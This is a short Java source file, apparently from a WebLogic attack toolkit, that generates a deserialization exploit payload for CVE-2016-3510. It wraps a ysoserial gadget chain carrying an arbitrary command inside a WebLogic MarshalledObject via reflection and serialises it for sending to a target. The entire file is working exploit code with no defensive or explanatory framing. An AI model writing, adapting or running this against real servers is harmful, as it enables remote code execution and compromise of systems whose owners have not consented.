package com.payload.t3;

import util.Ysoserial;
import weblogic.corba.utils.MarshalledObject;

import java.io.*;
import java.lang.reflect.Field;

public class CVE_2016_3510 {
    public static byte[] payload(String path,String gadget, String command) throws IOException,  NoSuchFieldException, IllegalAccessException{
        byte[] payload = Ysoserial.generate_gadget(path, gadget,command);
        MarshalledObject marshalledObject = new MarshalledObject("foo");
        Class cls = marshalledObject.getClass();
        Field field = cls.getDeclaredField("objBytes");
        field.setAccessible(true);
        field.set(marshalledObject, payload);
        byte[] payload1 = Ysoserial.serial(marshalledObject);
        return payload1;


    }

}
